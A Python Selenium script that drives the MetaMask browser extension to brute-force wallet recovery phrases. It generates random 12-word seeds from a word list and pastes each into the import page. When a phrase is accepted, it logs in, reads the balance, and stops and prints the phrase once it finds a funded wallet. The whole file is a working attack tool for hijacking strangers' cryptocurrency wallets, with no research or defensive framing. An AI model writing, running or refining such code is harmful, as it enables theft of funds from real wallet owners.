
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import subprocess
import pyperclip as pc
import random


# the path of .crx file
EXTENSION_PATH = "./extension.crx"
metaMask_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"

opt = webdriver.ChromeOptions()
opt.add_extension(EXTENSION_PATH)  # add the extension
driver = webdriver.Chrome(options=opt)  # open chrome with metamask extension

# then  seed phrase

driver.get('chrome-extension://'+metaMask_id + '/home.html#onboarding/import-with-recovery-phrase')
time.sleep(5)

# switch tab
driver.switch_to.window(driver.window_handles[0])

driver.find_element(by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]')  # select textbox

# Categorize the words


seed_words = ['']
fours = []
fives = []
sixes = []
sevens = []

# get the words  from file
with open('wordlist.txt') as wordlist:
    for line in wordlist:
        if len(line.strip()) == 4:
            fours.append(line.strip())
        elif (len(line.strip()) == 5):
            fives.append(line.strip())
        elif (len(line.strip()) == 6):
            sixes.append(line.strip())
        elif (len(line.strip()) == 7):
            sevens.append(line.strip())

fiveLess = []
sixLess = []
sivenLess = []

# fill words to fiveless
fivesCounter = 0
for i in range(0, 5000):
    randFive = random.choice(fives)
    if randFive not in fiveLess:
        fiveLess.append(randFive)
        fivesCounter += 1

sixesCounter = 0
# fill words to sixesLess
for i in range(0, 5000):
    randSix = random.choice(sixes)
    if randSix not in sixLess:
        sixLess.append(randSix)
        sixesCounter += 1

sevenCounter = 0
# fill words to sivensLess
for i in range(0, 5000):
    randSeven = random.choice(sevens)
    if randSeven not in sivenLess:
        sivenLess.append(randSeven)
        sevenCounter += 1

choices = [fours, fiveLess, sixLess, sivenLess]

seedCounter = 0

while seedCounter < 5000:
    seed = []

    password = "12345678@@@"
    count = 1

    keys = [i for i in range(1, 13)]
    seed_words = dict(zip(keys, seed))

    string = ''
    arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]

    t0 = time.time()
    looper = True
    while looper:
        # populate string:
        seed = []
        while len(seed) < 12:

            wordLengthChoice = random.choice(choices)
            wordChoice = random.choice(wordLengthChoice)
            seed.append(wordChoice)
            seedCounter += 1

        keys = [i for i in range(1, 13)]
        seed_words = dict(zip(keys, seed))
        print("START:", arr, [seed_words[i] for i in arr])

        string = ''
        for i in arr:
            string += ' ' + seed_words[i]
        string.strip()

        pc.copy(string)  # copy the string

        driver.find_element(by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]').send_keys(Keys.CONTROL + 'v')  # paste string

        # if invalid seed phrase:
        try:
            # check to see if invalid message pops up

            try:
                time.sleep(0.1)
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[4]/div/div/div[4]/span')
            except:
                time.sleep(0.1)
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/form/div[1]/div[4]/span')

            # get next words increment
            print('Attempts', count, end='\r', flush=False)
            print('count/sec:', "{:.2f}".format(count/(time.time() - t0)),
                  '---- count:', count, end='\r', flush=True)
            count += 1

        # if valid seed phrase:
        except:
            # enter into wallet:
            try:
                driver.find_element(By.CSS_SELECTOR, value='#app-content > div > div.mm-box.main-container-wrapper > div > div > div > div.import-srp__actions > div > button').click()
            except:
                pass

            time.sleep(2)

            try:
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[1]/label/input').send_keys(password)  # enter pass
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[2]/label/input').send_keys(password)  # confirm pass
            except:
                driver.find_element(by=By.XPATH, value='//*[@id="password"]').send_keys(password)  # enter pass
                driver.find_element(by=By.XPATH, value='//*[@id="confirm-password"]').send_keys(password)  # confirm pass


            try:  # after first login, check box
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/div[3]/label/span[1]/input').click()  # click check box
            except:
                pass
            
            try:  # After that - first login ->import btn -> restore btn
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/button').click()  # click import
            except:
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/form/button').click()  # click restore

            # we need to wait for the  the page to load!!
            time.sleep(2)

            try:
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button[1]').click()  # click remind me later
                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[1]/div/div/label/input').click()  # click check box
                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[2]/div/button[2]').click()  # click skip button
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[3]/button').click()  # click done button
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button').click()  # click next button
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/button').click()  # click done button
                time.sleep(1)
                driver.find_element(by=By.CSS_SELECTOR, value='#popover-content > div > div > section > div.box.popover-scroll-button.box--display-flex.box--flex-direction-row.box--justify-content-center.box--align-items-center.box--color-icon-default.box--background-color-background-default.box--border-color-border-default.box--border-style-solid.box--border-width-1').click()
                time.sleep(3)
                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[2]/div/div/div/label/span[1]').click()  # check terms of service
                driver.find_element(by=By.XPATH, value='//*[@id="popover-content"]/div/div/section/div[3]/button').click()  # click accept button
            except:
                time.sleep(4.5)
                pass
            
            # once we in wallet
            elem = driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[3]/div/div/div/div[1]/div/div[1]/div/div/div/div[1]/div/span[1]')  # find balance element
            usd = float(elem.text[1:].replace("$", ""))  # get the balance in usd
            if usd == 0:
                seed = []  # reset seed
                looper = True  # continue loop
                print(count, 'the account is empty:', string)
                count += 1

                time.sleep(1)

                # click on profile
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div[3]/div/div/button').click()

                # click 'lock' account
                driver.find_element(by=By.XPATH, value='//*[@id="app-content"]/div/div[2]/div/div[3]/div[2]/button[8]').click()

                time.sleep(0.02)

                driver.get('chrome-extension://' + metaMask_id + '/home.html#restore-vault')
            else:
                looper = False  # terminate the loop
                # print the seed and balance
                print("DONE", string, '$', str(usd))
                print(count)  # print the number of attempts


